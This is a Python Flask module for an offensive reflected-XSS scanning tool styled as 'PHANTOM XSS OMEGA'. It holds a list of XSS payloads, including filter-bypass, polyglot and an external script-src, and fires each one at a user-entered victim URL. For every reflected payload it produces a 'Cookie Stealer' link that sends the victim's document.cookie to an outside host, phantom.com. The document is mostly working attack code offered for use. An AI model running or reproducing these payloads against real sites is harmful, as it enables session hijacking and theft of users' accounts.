from flask import Blueprint, render_template_string, request, jsonify
import requests

script21_bp = Blueprint('script21', __name__)

# --- OMEGA PAYLOAD VAULT (High Success Rate) ---
# Maine categories wise payloads distribute kar diye hain
OMEGA_VAULT = {
    "Basic_Tag": "<script>alert(1)</script>",
    "Img_Bypass": "<img src=x onerror=alert(1)>",
    "SVG_Logic": "<svg onload=alert(1)>",
    "Body_Onload": "<body onload=alert(1)>",
    "Iframe_Javascript": "<iframe src='javascript:alert(1)'></iframe>",
    "Details_Toggle": "<details open ontoggle=alert(1)>",
    "Video_Event": "<video><source onerror=alert(1)>",
    "Autofocus_Attack": "<input autofocus onfocus=alert(1)>",
    "Entity_Encoding": "&#60;script&#62;alert(1)&#60;/script&#62;",
    "Script_Src_Bypass": "<script src='//xss.report/c/phantom'></script>",
    "Polyglot_Vector": "jaVasCript:/*-/*`/*\\'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e",
    "WAF_Filter_Bypass": "<scr<script>ipt>alert(1)</scr<script>ipt>",
    "Markdown_Link": "[XSS](javascript:alert(1))",
    "Global_Event": "'\" autofocus onfocus=alert(1) x='",
    "Null_Byte_Injection": "%00<script>alert(1)</script>"
}

UI = """
<!DOCTYPE html>
<html>
<head>
    <title>XSS_PHANTOM_OMEGA_v3.0</title>
    <style>
        body { background: #050505; color: #00ff00; font-family: 'Consolas', monospace; margin: 0; padding: 20px; }
        .container { max-width: 1200px; margin: auto; border: 1px solid #00ff00; padding: 20px; background: #000; box-shadow: 0 0 40px #00ff0055; }
        .header { text-align: center; border-bottom: 2px solid #00ff00; padding-bottom: 10px; margin-bottom: 20px; }
        input { width: 70%; padding: 12px; background: #111; border: 1px solid #00ff00; color: #fff; border-radius: 5px; }
        button { padding: 12px 30px; background: #00ff00; color: #000; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; }
        button:hover { background: #fff; box-shadow: 0 0 15px #fff; }
        
        .grid { display: grid; grid-template-columns: 1fr 1.5fr; gap: 20px; margin-top: 20px; }
        .panel { border: 1px solid #333; padding: 15px; background: #080808; height: 500px; overflow-y: auto; }
        h3 { color: #00ff00; margin-top: 0; border-bottom: 1px solid #333; font-size: 16px; }
        
        .log-row { padding: 8px; border-bottom: 1px solid #222; font-size: 12px; }
        .vuln { color: #ff0000; background: rgba(255,0,0,0.1); border: 1px solid #ff0000; margin: 5px 0; border-radius: 3px; }
        .safe { color: #555; }
        
        .exploit-card { background: #111; padding: 12px; margin-bottom: 15px; border-left: 5px solid #00ff00; }
        code { color: #fff; font-size: 11px; display: block; margin-top: 5px; word-break: break-all; background: #000; padding: 5px; border: 1px solid #222; }
        .badge { background: #00ff00; color: #000; padding: 2px 5px; font-size: 10px; font-weight: bold; border-radius: 3px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>☣️ PHANTOM XSS OMEGA v3.0 ☣️</h1>
            <p>ADVANCED PAYLOAD VAULT & REFLECTION ANALYZER</p>
        </div>

        <div style="text-align:center;">
            <input type="text" id="target" placeholder="Target URL: http://victim.com/search.php?query=">
            <button onclick="launchAttack()">LAUNCH OMEGA SCAN</button>
        </div>

        <div class="grid">
            <div class="panel">
                <h3>[ REAL-TIME TRAFFIC ANALYSIS ]</h3>
                <div id="logs">Ready to inject...</div>
            </div>
            <div class="panel">
                <h3>[ VULNERABILITY REPORT & EXPLOITS ]</h3>
                <div id="report">Vulnerabilities will be displayed here.</div>
            </div>
        </div>
    </div>

    <script>
        async function launchAttack() {
            const url = document.getElementById('target').value;
            const logBox = document.getElementById('logs');
            const reportBox = document.getElementById('report');
            
            if(!url) return alert("Target URL Required!");
            
            logBox.innerHTML = "<div>[*] Initializing OMEGA Payload Injection...</div>";
            reportBox.innerHTML = "Scanning deep nodes...";

            const res = await fetch('/script21/analyze', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ url: url })
            });
            const data = await res.json();

            logBox.innerHTML = "";
            data.results.forEach(item => {
                const div = document.createElement('div');
                div.className = item.status === "VULNERABLE" ? "log-row vuln" : "log-row safe";
                div.innerHTML = `<strong>[${item.status}]</strong> - Vector: ${item.name} <br> <code>${item.payload}</code>`;
                logBox.appendChild(div);
            });

            if(data.vulnerable) {
                reportBox.innerHTML = "<h4>🔥 TARGET COMPROMISED - GENERATING EXPLOITS:</h4>";
                data.exploits.forEach(ex => {
                    reportBox.innerHTML += `
                        <div class="exploit-card">
                            <span class="badge">${ex.type}</span>
                            <code>${ex.link}</code>
                        </div>`;
                });
            } else {
                reportBox.innerHTML = "Target seems hardened against current payload vault.";
            }
        }
    </script>
</body>
</html>
"""

@script21_bp.route('/')
def index():
    return render_template_string(UI)

@script21_bp.route('/analyze', methods=['POST'])
def analyze():
    target = request.json.get('url')
    results = []
    vulnerable_links = []
    is_vulnerable = False

    for name, payload in OMEGA_VAULT.items():
        try:
            test_url = target + payload
            # Hum server-side check kar rahe hain agar payload reflect hota hai
            response = requests.get(test_url, timeout=5)
            
            if payload in response.text:
                results.append({"status": "VULNERABLE", "name": name, "payload": payload})
                is_vulnerable = True
                # Generating deep exploits
                vulnerable_links.append({"type": "Full Exploit", "link": test_url})
                vulnerable_links.append({"type": "Cookie Stealer", "link": test_url.replace(payload, "<script>document.location='http://phantom.com/log?c='+document.cookie</script>")})
            else:
                results.append({"status": "SAFE", "name": name, "payload": payload})
        except:
            results.append({"status": "ERROR", "name": name, "payload": "Connection Failed"})

    return jsonify({
        "results": results, 
        "vulnerable": is_vulnerable,
        "exploits": vulnerable_links
    })

